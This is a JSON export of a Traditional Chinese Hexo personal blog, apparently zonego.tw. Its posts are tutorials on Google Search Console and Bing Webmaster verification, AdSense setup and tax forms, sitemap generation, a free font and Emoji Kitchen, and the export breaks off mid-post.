{"meta":{"title":"筆記ZONE","subtitle":"","description":"","author":"Zone Lin","url":"https://zonego.tw","root":"/"},"pages":[{"title":"","date":"2024-12-25T01:42:31.141Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"404.css","permalink":"https://zonego.tw/404.css","excerpt":"","text":"@import url(\"https://fonts.googleapis.com/css?family=Barlow+Condensed:300,400,500,600,700,800,900|Barlow:300,400,500,600,700,800,900&display=swap\"); .about { position: fixed; z-index: 10; bottom: 10px; right: 10px; width: 40px; height: 40px; display: flex; justify-content: flex-end; align-items: flex-end; transition: all 0.2s ease; } .about .bg_links { width: 40px; height: 40px; border-radius: 100%; display: flex; justify-content: center; align-items: center; background-color: rgba(0, 0, 0, 0.2); border-radius: 100%; backdrop-filter: blur(5px); position: absolute; } .about .logo { width: 40px; height: 40px; z-index: 9; background-image: url(https://rafaelavlucas.github.io/assets/codepen/logo_white.svg); background-size: 50%; background-repeat: no-repeat; background-position: 10px 7px; opacity: 0.9; transition: all 1s 0.2s ease; bottom: 0; right: 0; } .about .social { opacity: 0; right: 0; bottom: 0; } .about .social .icon { width: 100%; height: 100%; background-size: 20px; background-repeat: no-repeat; background-position: center; background-color: transparent; display: flex; transition: all 0.2s ease, background-color 0.4s ease; opacity: 0; border-radius: 100%; } .about .social.portfolio { transition: all 0.8s ease; } .about .social.portfolio .icon { background-image: url(https://rafaelavlucas.github.io/assets/codepen/link.svg); } .about .social.dribbble { transition: all 0.3s ease; } .about .social.dribbble .icon { background-image: url(https://rafaelavlucas.github.io/assets/codepen/dribbble.svg); } .about .social.linkedin { transition: all 0.8s ease; } .about .social.linkedin .icon { background-image: url(https://rafaelavlucas.github.io/assets/codepen/linkedin.svg); } .about:hover { width: 105px; height: 105px; transition: all 0.6s cubic-bezier(0.64, 0.01, 0.07, 1.65); } .about:hover .logo { opacity: 1; transition: all 0.6s ease; } .about:hover .social { opacity: 1; } .about:hover .social .icon { opacity: 0.9; } .about:hover .social:hover { background-size: 28px; } .about:hover .social:hover .icon { background-size: 65%; opacity: 1; } .about:hover .social.portfolio { right: 0; bottom: calc(100% - 40px); transition: all 0.3s 0s cubic-bezier(0.64, 0.01, 0.07, 1.65); } .about:hover .social.portfolio .icon:hover { background-color: #698fb7; } .about:hover .social.dribbble { bottom: 45%; right: 45%; transition: all 0.3s 0.15s cubic-bezier(0.64, 0.01, 0.07, 1.65); } .about:hover .social.dribbble .icon:hover { background-color: #ea4c89; } .about:hover .social.linkedin { bottom: 0; right: calc(100% - 40px); transition: all 0.3s 0.25s cubic-bezier(0.64, 0.01, 0.07, 1.65); } .about:hover .social.linkedin .icon:hover { background-color: #0077b5; } h1, h2, h3, h4, h5, h6, p, ul, li, button, a, i, input, body { margin: 0; padding: 0; list-style: none; border: 0; -webkit-tap-highlight-color: transparent; text-decoration: none; color: inherit; } h1:focus, h2:focus, h3:focus, h4:focus, h5:focus, h6:focus, p:focus, ul:focus, li:focus, button:focus, a:focus, i:focus, input:focus, body:focus { outline: 0; } body { margin: 0; padding: 0; height: auto; font-family: \"Barlow\", sans-serif; background: #695681; } .logo { position: fixed; z-index: 5; bottom: 10px; right: 10px; width: 40px; height: 40px; border-radius: 100%; display: flex; justify-content: center; align-items: center; background: rgba(0, 0, 0, 0.1); border-radius: 100%; backdrop-filter: blur(5px); } .logo img { width: 55%; height: 55%; transform: translateY(-1px); opacity: 0.8; } nav .menu { width: 100%; height: 80px; position: absolute; display: flex; align-items: center; justify-content: space-between; padding: 0 5%; box-sizing: border-box; z-index: 3; } nav .menu .website_name { color: #695681; font-weight: 600; font-size: 20px; letter-spacing: 1px; background: white; padding: 4px 8px; border-radius: 2px; opacity: 0.5; transition: all 0.4s ease; cursor: pointer; } nav .menu .website_name:hover { opacity: 1; } nav .menu .menu_links { transition: all 0.4s ease; opacity: 0.5; } nav .menu .menu_links:hover { opacity: 1; } @media screen and (max-width: 799px) { nav .menu .menu_links { display: none; } } nav .menu .menu_links .link { color: white; text-transform: uppercase; font-weight: 500; margin-right: 50px; letter-spacing: 2px; position: relative; transition: all 0.3s 0.2s ease; } nav .menu .menu_links .link:last-child { margin-right: 0; } nav .menu .menu_links .link:before { content: \"\"; position: absolute; width: 0px; height: 4px; background: linear-gradient(90deg, #FFEDC0 0%, #FF9D87 100%); bottom: -10px; border-radius: 4px; transition: all 0.4s cubic-bezier(0.82, 0.02, 0.13, 1.26); left: 100%; } nav .menu .menu_links .link:hover { opacity: 1; color: #FB8A8A; } nav .menu .menu_links .link:hover:before { width: 40px; left: 0; } nav .menu .menu_icon { width: 40px; height: 40px; position: relative; display: none; justify-content: center; align-items: center; cursor: pointer; } @media screen and (max-width: 799px) { nav .menu .menu_icon { display: flex; } } nav .menu .menu_icon .icon { width: 24px; height: 2px; background: white; position: absolute; } nav .menu .menu_icon .icon:before, nav .menu .menu_icon .icon:after { content: \"\"; width: 100%; height: 100%; background: inherit; position: absolute; transition: all 0.3s cubic-bezier(0.49, 0.04, 0, 1.55); } nav .menu .menu_icon .icon:before { transform: translateY(-8px); } nav .menu .menu_icon .icon:after { transform: translateY(8px); } nav .menu .menu_icon:hover .icon { background: #FFEDC0; } nav .menu .menu_icon:hover .icon:before { transform: translateY(-10px); } nav .menu .menu_icon:hover .icon:after { transform: translateY(10px); } .wrapper { display: grid; grid-template-columns: 1fr; justify-content: center; align-items: center; height: 100vh; overflow-x: hidden; } .wrapper .container { margin: 0 auto; transition: all 0.4s ease; display: flex; justify-content: center; align-items: center; position: relative; } .wrapper .container .scene { position: absolute; width: 100vw; height: 100vh; vertical-align: middle; } .wrapper .container .one, .wrapper .container .two, .wrapper .container .three, .wrapper .container .circle, .wrapper .container .p404 { width: 60%; height: 60%; top: 20% !important; left: 20% !important; min-width: 400px; min-height: 400px; } .wrapper .container .one .content, .wrapper .container .two .content, .wrapper .container .three .content, .wrapper .container .circle .content, .wrapper .container .p404 .content { width: 600px; height: 600px; display: flex; justify-content: center; align-items: center; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); animation: content 0.8s cubic-bezier(1, 0.06, 0.25, 1) backwards; } @keyframes content { 0% { width: 0; } } .wrapper .container .one .content .piece, .wrapper .container .two .content .piece, .wrapper .container .three .content .piece, .wrapper .container .circle .content .piece, .wrapper .container .p404 .content .piece { width: 200px; height: 80px; display: flex; position: absolute; border-radius: 80px; z-index: 1; animation: pieceLeft 8s cubic-bezier(1, 0.06, 0.25, 1) infinite both; } @keyframes pieceLeft { 50% { left: 80%; width: 10%; } } @keyframes pieceRight { 50% { right: 80%; width: 10%; } } @media screen and (max-width: 799px) { .wrapper .container .one, .wrapper .container .two, .wrapper .container .three, .wrapper .container .circle, .wrapper .container .p404 { width: 90%; height: 90%; top: 5% !important; left: 5% !important; min-width: 280px; min-height: 280px; } } @media screen and (max-height: 660px) { .wrapper .container .one, .wrapper .container .two, .wrapper .container .three, .wrapper .container .circle, .wrapper .container .p404 { min-width: 280px; min-height: 280px; width: 60%; height: 60%; top: 20% !important; left: 20% !important; } } .wrapper .container .text { width: 60%; height: 40%; min-width: 400px; min-height: 500px; position: absolute; margin: 40px 0; animation: text 0.6s 1.8s ease backwards; } @keyframes text { 0% { opacity: 0; transform: translateY(40px); } } @media screen and (max-width: 799px) { .wrapper .container .text { min-height: 400px; height: 80%; } } .wrapper .container .text article { width: 400px; position: absolute; bottom: 0; z-index: 4; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; bottom: 0; left: 50%; transform: translateX(-50%); } @media screen and (max-width: 799px) { .wrapper .container .text article { width: 100%; } } .wrapper .container .text article p { color: white; font-size: 18px; letter-spacing: 0.6px; margin-bottom: 40px; text-shadow: 6px 6px 10px #32243E; } .wrapper .container .text article button { height: 40px; padding: 0 30px; border-radius: 50px; cursor: pointer; box-shadow: 0px 15px 20px rgba(54, 24, 79, 0.5); z-index: 3; color: #695681; background-color: white; text-transform: uppercase; font-weight: 600; font-size: 12px; transition: all 0.3s ease; } .wrapper .container .text article button:hover { box-shadow: 0px 10px 10px -10px rgba(54, 24, 79, 0.5); transform: translateY(5px); background: #FB8A8A; color: white; } .wrapper .container .p404 { font-size: 200px; font-weight: 700; letter-spacing: 4px; color: white; display: flex !important; justify-content: center; align-items: center; position: absolute; z-index: 2; animation: anime404 0.6s cubic-bezier(0.3, 0.8, 1, 1.05) both; animation-delay: 1.2s; } @media screen and (max-width: 799px) { .wrapper .container .p404 { font-size: 100px; } } @keyframes anime404 { 0% { opacity: 0; transform: scale(10) skew(20deg, 20deg); } } .wrapper .container .p404:nth-of-type(2) { color: #36184F; z-index: 1; animation-delay: 1s; filter: blur(10px); opacity: 0.8; } .wrapper .container .circle { position: absolute; } .wrapper .container .circle:before { content: \"\"; position: absolute; width: 800px; height: 800px; background-color: rgba(54, 24, 79, 0.2); border-radius: 100%; top: 50%; left: 50%; transform: translate(-50%, -50%); box-shadow: inset 5px 20px 40px rgba(54, 24, 79, 0.25), inset 5px 0px 5px rgba(50, 36, 62, 0.3), inset 5px 5px 20px rgba(50, 36, 62, 0.25), 2px 2px 5px rgba(255, 255, 255, 0.2); animation: circle 0.8s cubic-bezier(1, 0.06, 0.25, 1) backwards; } @keyframes circle { 0% { width: 0; height: 0; } } @media screen and (max-width: 799px) { .wrapper .container .circle:before { width: 400px; height: 400px; } } .wrapper .container .one .content:before { content: \"\"; position: absolute; width: 600px; height: 600px; background-color: rgba(54, 24, 79, 0.3); border-radius: 100%; box-shadow: inset 5px 20px 40px rgba(54, 24, 79, 0.25), inset 5px 0px 5px rgba(50, 36, 62, 0.3), inset 5px 5px 20px rgba(50, 36, 62, 0.25), 2px 2px 5px rgba(255, 255, 255, 0.2); animation: circle 0.8s 0.4s cubic-bezier(1, 0.06, 0.25, 1) backwards; } @media screen and (max-width: 799px) { .wrapper .container .one .content:before { width: 300px; height: 300px; } } .wrapper .container .one .content .piece { background: linear-gradient(90deg, #8077EA 13.7%, #EB73FF 94.65%); } .wrapper .container .one .content .piece:nth-child(1) { right: 15%; top: 18%; height: 30px; width: 120px; animation-delay: 0.5s; animation-name: pieceRight; } .wrapper .container .one .content .piece:nth-child(2) { left: 15%; top: 45%; width: 150px; height: 50px; animation-delay: 1s; animation-name: pieceLeft; } .wrapper .container .one .content .piece:nth-child(3) { left: 10%; top: 75%; height: 20px; width: 70px; animation-delay: 1.5s; animation-name: pieceLeft; } .wrapper .container .two .content .piece { background: linear-gradient(90deg, #FFEDC0 0%, #FF9D87 100%); } .wrapper .container .two .content .piece:nth-child(1) { left: 0%; top: 25%; height: 40px; width: 120px; animation-delay: 2s; animation-name: pieceLeft; } .wrapper .container .two .content .piece:nth-child(2) { right: 15%; top: 35%; width: 180px; height: 50px; animation-delay: 2.5s; animation-name: pieceRight; } .wrapper .container .two .content .piece:nth-child(3) { right: 10%; top: 80%; height: 20px; width: 160px; animation-delay: 3s; animation-name: pieceRight; } .wrapper .container .three .content .piece { background: #FB8A8A; } .wrapper .container .three .content .piece:nth-child(1) { left: 25%; top: 35%; height: 20px; width: 80px; animation-name: pieceLeft; animation-delay: 3.5s; } .wrapper .container .three .content .piece:nth-child(2) { right: 10%; top: 55%; width: 140px; height: 40px; animation-name: pieceRight; animation-delay: 4s; } .wrapper .container .three .content .piece:nth-child(3) { left: 40%; top: 68%; height: 20px; width: 80px; animation-name: pieceLeft; animation-delay: 4.5s; }"},{"title":"","date":"2024-12-25T01:42:31.149Z","updated":"2024-12-25T01:42:31.149Z","comments":true,"path":"custom.css","permalink":"https://zonego.tw/custom.css","excerpt":"","text":":root { --gutter: 25px; --radius: 13px; --color-primary: #3a6afa; --color2: #ff761e; --color3: #ffb900; --color4: #33d57a; --color5: #00dbff; --color6: #1a98ff; --color7: #9090ff; --color-primary-bg: rgba(199, 128, 254, 0.15); --color2-bg: rgba(255,118,30,0.15); --color3-bg: rgba(255,185,0,0.15); --color4-bg: rgba(51,213,122,0.15); --color5-bg: rgba(0,219,255,0.15); --color6-bg: rgba(26,152,255,0.15); --color7-bg: rgba(144,144,255,0.15); --color-shadow: rgba(75, 141, 255, 0.4); }"},{"title":"","date":"2024-12-25T01:42:31.145Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"about/index.html","permalink":"https://zonego.tw/about/index.html","excerpt":"","text":"關於我一個喜歡 DIY、研究伺服器的宅宅 這邊會分享一些軟體、網站開發、架設 HomeLab 的學習過程與筆記 聯絡我Email: &#x74;&#x68;&#53;&#51;&#51;&#x31;&#x39;&#x35;&#56;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109; 關於網站本網站使用 HEXO 製作 HEXO官網: https://hexo.io/zh-tw/ 至於怎麼架，改天寫一篇來跟大家分享 使用的主題本站使用 nexmoe 主題 Github: https://github.com/theme-nexmoe/hexo-theme-nexmoe說明文件: https://docs.nexmoe.com/ 封面圖部分封面圖來源於 unsplash圖庫，點下方圖片可連結至圖片分享位置。"},{"title":"所有文章","date":"2024-12-25T01:42:31.145Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"archive/index.html","permalink":"https://zonego.tw/archive/index.html","excerpt":"","text":""},{"title":"免費素材整理","date":"2023-08-08T07:33:28.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"assets/index.html","permalink":"https://zonego.tw/assets/index.html","excerpt":"這邊整理一些免費可使用的網路資源","text":"這邊整理一些免費可使用的網路資源 圖庫unsplashhttps://unsplash.com/ 免費使用的規範：✅ 全部照片可以免費下載及使用✅ 可一般使用及商用✅ 不需要授權 (雖然沒有明定，但請盡量註名出處)🚫 未經大幅修改重製，禁止直接售出圖片🚫 直接抓取圖片做類似的服務 下載圖片時，可以直接複製下面的標注文字，註明圖片來源 除免費版以外 unsplash 還有推訂閱版 Unsplash+部分照片僅限訂閱用戶可以下載，並保證使用這些照片不會侵犯第三方智慧財產權或形象權 TopeconHeroes日本的免費素材圖庫，可商用素材大部分是圖片類，不過也有提供背景音樂 圖片可用於創作、改作，但禁止直接利用圖片營利 (如收費的素材包) 網站都依照主題分類，這邊只列其中幾個建議可以去其中一個分類網站，上面會有各個分類的連結 輪廓素材https://kage-design.com/ 邊框https://frames-design.com/ 背景音樂http://dust-sounds.com/ 圖標 ICONflaticons無版權圖標工具網站，提供免費模版及線上編輯功能，創作的圖標可以免費商用https://flaticons.net/ 如果你懶，有提供別人預先做好的付費組合包 homer-icons熱門自架服務 (Self-Hosted) 及網站的 ICONhttps://github.com/NX211/homer-icons 範例： 字型芫荽 &#x2F; iansui 硬筆楷書字型"},{"title":"留言板","date":"2024-12-25T01:42:31.149Z","updated":"2024-12-25T01:42:31.149Z","comments":true,"path":"board/index.html","permalink":"https://zonego.tw/board/index.html","excerpt":"","text":""},{"title":"","date":"2024-12-25T01:42:31.149Z","updated":"2024-12-25T01:42:31.149Z","comments":true,"path":"donate/index.html","permalink":"https://zonego.tw/donate/index.html","excerpt":"","text":"贊助我如果你喜歡這個網站，歡迎請我喝杯咖啡☕ 或多幫我點一些廣告"},{"title":"隱私政策","date":"2023-08-21T03:30:45.000Z","updated":"2024-12-25T01:42:31.405Z","comments":true,"path":"privacy/index.html","permalink":"https://zonego.tw/privacy/index.html","excerpt":"","text":"施工中"},{"title":"","date":"2024-12-25T01:42:31.405Z","updated":"2024-12-25T01:42:31.405Z","comments":true,"path":"rss/index.html","permalink":"https://zonego.tw/rss/index.html","excerpt":"","text":"RSS 2.0https://zonego.tw/rss.xml ATOMhttps://zonego.tw/atom.xml JSON FEEDhttps://zonego.tw/feed.json 在 Hexo 中設定 RSS請參考增加 Hexo 的 RSS, ATOM, JSON Feed 訂閱功能"}],"posts":[{"title":"芫荽 繁中字型","slug":"iansui-font","date":"2024-04-15T02:40:10.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2024/04/15/iansui-font/","link":"","permalink":"https://zonego.tw/2024/04/15/iansui-font/","excerpt":"","text":"芫荽 &#x2F; iansui第一套為台灣教育使用所改造的繁體硬筆楷書字型 An open source Chinese font derived from Klee One (Fontworks).基於 Fontworks 的 Klee One 衍生的開源繁體中文字型。 開源授權規定除單獨出售字型檔禁止外，任何人可以無償使用此字型，包含商用。無須告知原作者。 下載GitHub 下載點 在 GitHub 專案的 Release 頁面，點最新版本的 iansui.zip 下載 將 iansui.zip 解壓縮後，找到 Iansui-Regular.ttf 點兩下即可安裝。 另外也有發音符號的版本 注音芫荽 芫荽的注音字型。 字咍芫荽 台語標音字型家族。 圖片、資訊來源：美感細胞 教科書再造計畫","categories":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/categories/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}],"tags":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"},{"name":"字型","slug":"字型","permalink":"https://zonego.tw/tags/%E5%AD%97%E5%9E%8B/"}]},{"title":"Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容","slug":"BingWebmasterTools","date":"2023-10-02T03:14:09.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/10/02/BingWebmasterTools/","link":"","permalink":"https://zonego.tw/2023/10/02/BingWebmasterTools/","excerpt":"","text":"之前寫過讓 Google 主動來爬我們的網站內容，但世界上不只有 google 這個搜尋引擎微軟的搜尋引擎 Bing 雖然不是最多人使用，不過為了增加網站曝光，就來設定 Webmaster Tools 吧反正設定也不用錢 其他搜尋引擎請參考 Google Search Console - 讓 Google 搜尋到部落格內容 登入 Microsoft 帳號註冊就跳過吧，應該大家都會真的沒有的話，也可以用 Google 或 FB 帳號登入 從 Google Search Console 匯入網站登入後選擇新增站點 如果之前已經設定過 Google Search Console可以連結 Google 帳號，將設定匯入 Bing Webmaster Tools 由於我的部落格 https://zonego.tw 已經匯入過，所以我的 Google 帳號內會沒有其他網站能匯入正常的話這邊選擇網站匯入就可以了 新增網站至 Webmaster Tools新增站點這邊輸入網站的網址 以新增 https://example.zonego.tw 為範例下一步就是要驗證網站是你的，有三種驗證方法 1.BingSiteAuth.xml下載驗證用的 BingSiteAuth.xml 檔案，放在網站的根目錄https://example.zonego.tw/BingSiteAuth.xml 2.在頁面的 Header 加入驗證資料 在網站的所有頁面 Header 中加入驗證碼 &lt;head&gt; ... ‹meta name=&quot;msvalidate.01&quot; content=&quot;2218F52174A741F96454DA55D7A664AA&quot; /&gt;&lt;/head&gt; 3.透過DNS驗證網站在網域的DNS紀錄加入 CNAME 轉至 verify.bing.com 完成之後，對DNS查詢 82d5e001135888feb5576ef02ef31223.zonego.tw 應該轉至 verify.bing.com 設定 Sitemap接下來新增網站的 sitemap 網址，讓微軟的爬蟲知道有哪些公開頁面可以爬資料例如我的網站 sitemap 就放在 https://zonego.tw/sitemap.xml 完成之後等待一段時間，在 Bing 搜尋就會找到我們網站的內容了 🎉","categories":[],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"搜尋引擎","slug":"搜尋引擎","permalink":"https://zonego.tw/tags/%E6%90%9C%E5%B0%8B%E5%BC%95%E6%93%8E/"}]},{"title":"Emoji Kitchen 自己組合出想要的表情符號","slug":"emoji-kitchen","date":"2023-09-18T04:00:32.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/09/18/emoji-kitchen/","link":"","permalink":"https://zonego.tw/2023/09/18/emoji-kitchen/","excerpt":"","text":"Gboard 鍵盤Google 出的 Gboard 鍵盤上推出 Emoji Kitchen 功能 Gboard Google Play 商店連結：https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin 簡單來說，在可以傳圖片的地方 (如 Discord)，用 Gboard 鍵盤輸入兩個 emiji 就可以將融合後的圖片傳出去 網頁版當初只在Gboard 鍵盤上的 Emoji Kitchen 合成功能現在開放網頁版啦 只要在 Google 搜尋 Emoji Kitchen，組合完表情就產生出圖片了 網址：https://www.google.com/search?q=emoji+kitchen 要用時需要將圖片下載下來，或是複製圖片網址使用 &lt;!-- 複製圖片網址範例 --&gt;![](https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx) 開源版本在 Google 還沒開放網頁版功能之前，一些熱心開發者也做出類似的網站可以線上使用這邊介紹 xsalazar&#x2F;emoji-kitchen 使用時跟 Google 的網頁版一樣，需要將圖片下載下來，或是複製圖片網址使用 GitHub：https://github.com/xsalazar/emoji-kitchenEmoji Kitchen：https://emojikitchen.dev/","categories":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/categories/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"},{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}]},{"title":"Google AdSense 讓你的網站幫你賺錢","slug":"adsense","date":"2023-08-16T07:28:51.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/08/16/adsense/","link":"","permalink":"https://zonego.tw/2023/08/16/adsense/","excerpt":"","text":"申請 Google 帳號這個步驟就先跳過 接下來到 AdSense 網站 https://www.google.com/adsense 套用 AdSense 設定要套用的網站點新增網站之後，打入網站的連結，例如 https://example.com 接下來要驗證網站是你的，有兩種方式 使用 AdSense 程式碼 使用 Ads.txt 驗證 使用 AdSense 程式碼將 Google 提供的代碼貼到個頁面的 header 以這個部落格的為例，nexmoe 這個主題有提供修改 header 的設定 修改 _config.nexmoe.yml，在 slotHead: 貼上即可 ...slotHead: | &lt;script async src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; 使用 Ads.txt 驗證建議使用這個方式驗證比較省事，如果我們不是用 Ads.txt 驗證網站所有權的話，後面還是要做這一步 步驟請跳下面說明 Ads.txt詳細請參考 Google 的說明 https://support.google.com/adsense/answer/12171612?hl=zh-Hant 簡單來說，美國為了保護下廣告的客戶，提供銷售廣告位的網站需要提供 Authorized Digital Sellers (簡稱 ads.txt) 設定 ads.txt如果驗證時不是用這個方式的話，可以點網站進去，Google 會產生 ads.txt 的內容可以複製 範例： google.com, pub-XXXXXX, DIRECT, XXXXXXX 以 Hexo 為例子，在 source 資料夾內新增 ads.txt，把剛剛複製的內容貼上修改 _config.yml 設定跳渲染 ads.txt (可參考 Hexo 指定文件跳過渲染) ...skip_render:- ads.txt 設定付款資料 付款資料點左側選單 &gt; 付款 &gt; 付款資訊 付款帳戶的資料基本上不用管它，想要調整收到前的時間可以改付款時間表，最少需要累積到 100 美金才領的出來 美國稅籍資料畢竟 Google 是美國公司，照美國的稅制大概會收 24% 起跳的稅金外國人可以申請 W-8BEN 來降低稅收，只有針對美國人銷售、營利才需要收 30% 稅金 簡單來說假設你的網站有 100 美元的廣告收入，其中有 10% 的廣告收入是來自美國 稅金 實際收入 正常稅率 (未申請 W-8BEN) 100 * 24% &#x3D; 24 100 - 24 &#x3D; 76 有申請 W-8BEN (100 * 10%) * 30% &#x3D; 3 100 - 3 &#x3D; 97 所以，除非你的網站或 Youtube 頻道主要都是來自美國，不然申請 W-8BEN 扣的稅會比較少 我是參考雲爸的教學來填寫 https://dacota.tw/blog/post/google-adsense-w-8ben 付款資料內的姓名記得填護照的英文姓名，不然需要在另外上傳護照證明稅及跟帳號擁有者是同一人 付款方式付款方式要累積到能第一次領錢才能設定 台灣能使用的有2種方式 美元支票 電匯 https://lashiblog.com/google-adsense-payments/ 安插廣告 安插廣告到網站裡面有2種作法，自動廣告跟手動廣告 自動廣告在左邊選單 廣告 &gt; 按網站 &gt; 選你要啟用自動廣告的網站 這邊啟用之後就會自動在網站內插入廣告 (因為是自動，廣告可能會插在文中) 手動插入廣告在左邊選單 廣告 &gt; 按廣告單元 在這邊依照合適的版面類型建立廣告，建完之後會有給你廣告的代碼代碼大概分為三個部分 &lt;!--請放在 Header，只需要放一次--&gt;&lt;script async src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;!--放在頁面內你想出現廣告的地方，可在頁面內放多次--&gt;&lt;ins class=&quot;adsbygoogle&quot; style=&quot;display:block; text-align:center;&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-ID&quot; data-ad-slot=&quot;廣告單元ID&quot;&gt;&lt;/ins&gt;&lt;!--放在頁面最後，只需要放一次--&gt;&lt;script&gt; (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);&lt;/script&gt; 詳細可參考Google的說明https://support.google.com/adsense/answer/9190028?sjid=17637765633261310327-AP","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"},{"name":"廣告","slug":"廣告","permalink":"https://zonego.tw/tags/%E5%BB%A3%E5%91%8A/"}]},{"title":"Google Search Console - 讓 Google 搜尋到部落格內容","slug":"google-search-console","date":"2023-08-02T04:52:15.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/08/02/google-search-console/","link":"","permalink":"https://zonego.tw/2023/08/02/google-search-console/","excerpt":"","text":"建好一個新網站，在搜尋引擎爬到你的網站之前，當然會搜尋不到任何東西 那 Google 甚麼時候會時候會來爬我的網站? 真的就是隨緣 要主動讓搜尋引擎認識你的網站? 那就是要來設定 Google Search Console 其他搜尋引擎請參考 Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容 新增網站的 Sitemap去 Google 設定之前，我們需要先將搜尋引擎需要的網站地圖 sitemap.xml 產生出來。教學請看這篇 Hexo 自動產生網站的 sitemap 在 Google Search Console 新增網站註冊 Google 帳號這部份相信大家都會，跳過 新增網站接下來到 Google Search Console 去設定爬蟲來抓我們的網站Google Search Console 網址： https://search.google.com/search-console 資源類型分為兩類，網站前置字元代表只索引單一網站，網域則是歸在該網域下的所有網站都會索引。沒有特殊需求的話選網站前置字元就好。 驗證網站把要索引的網站打進去後，接下來要驗證網站是你的 下面的驗證方式選一個就好 HTML 檔案預設最簡單的驗證方式，只要將 google 提供的驗證用 html 檔案下載，放在 hexo 的目錄即可網站部屬之後可以在 https://yoursite.com/googleXXXXXXXXXXXXXXXX.html 看到驗證碼就可以去點驗證了 記得在 _config.yml 加入跳過這個檔案的渲染 詳細請看 Hexo 指定文件跳過渲染 skip_render:- googleXXXXXXXXXXXXXXXX.html HTML 標記在首頁的 Header 內加入驗證碼 https://yoursite.com/index.html &lt;meta name=&quot;google-site-verification&quot; content=&quot;key-XXX&quot; /&gt; Google Analytics如果你的網站有使用 Google Analytics 的話可以直接點驗整就好，反正也在設定 GA 時也算驗證過網站所有者了 網域名稱供應商在 DNS 內加入相同網域的 TXT 紀錄，裡面放驗證碼即可驗證如果是 cloud flare 的話就更簡單，只要照著點就好了不過設定時要注意衝突 完成驗證完之後等待 google 把 sitemap 內的頁面索引完，在 Google 搜尋你的網站可以被搜尋到了後續 google 會提是你的網站有什麼問題需要修正，未修正前會被排到搜尋列表的後面要被演算法排到前面就需要做 SEO (search engine optimizaton) 了","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"搜尋引擎","slug":"搜尋引擎","permalink":"https://zonego.tw/tags/%E6%90%9C%E5%B0%8B%E5%BC%95%E6%93%8E/"},{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"}]},{"title":"Hexo 自動產生網站的 sitemap","slug":"hexo-sitemap","date":"2023-07-26T05:18:46.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2023/07/26/hexo-sitemap/","link":"","permalink":"https://zonego.tw/2023/07/26/hexo-sitemap/","excerpt":"Sitemap 意思為網站地圖，主要是提供給搜尋引擎知道，這個網站有哪些頁面。當然，如果你喜歡看原始的 xml 檔，也可以給人看。","text":"Sitemap 意思為網站地圖，主要是提供給搜尋引擎知道，這個網站有哪些頁面。當然，如果你喜歡看原始的 xml 檔，也可以給人看。 hexo-generator-sitemapGitHub: https://github.com/hexojs/hexo-generator-sitemap 這個插件在我們部署 hexo 網站時，會自動幫我們產生 sitemap.xml 安裝npm install hexo-generator-sitemap --save Hexo 版本對應使用插件的版本 Hexo 插件 Hexo 4 2.x Hexo 3 1.x Hexo 2 0.x 調整設定修改 Hexo 的設定檔 _config.yml設定範例: ...sitemap: path: - sitemap.xml - sitemap.txt template: ./sitemap_template.xml template_txt: ./sitemap_template.txt rel: false tags: true categories: true 參數 說明 path 產生的 sitemap 檔案位置範例的寫法就是 http://localhost:4000/sitemap.xml如果不要生成 txt 格式可以不寫 - sitemap.txt template 用於產生 sitemap.xml 的模版檔案位置 template_txt 用於產生 sitemap.txt 的模版檔案位置(如果不要生成 sitemap.txt 可以不寫) rel 是否在 header 產生 rel-sitemap詳情請看說明 tags 是否產生個別 tag 頁面 categories 是否產生個別分類的頁面 建立模版檔案預設的 xml 與 txt 格式的模版可以在 github repo 內下載xml: https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.xmltxt: https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.txt 下載後放到 Hexo 的目錄即可 模版檔案的路徑可以自訂例如：模版檔案放在 your_hexo_site&#x2F;template&#x2F;sitemap.xml設定檔 _config.yml 內的模版路徑 template 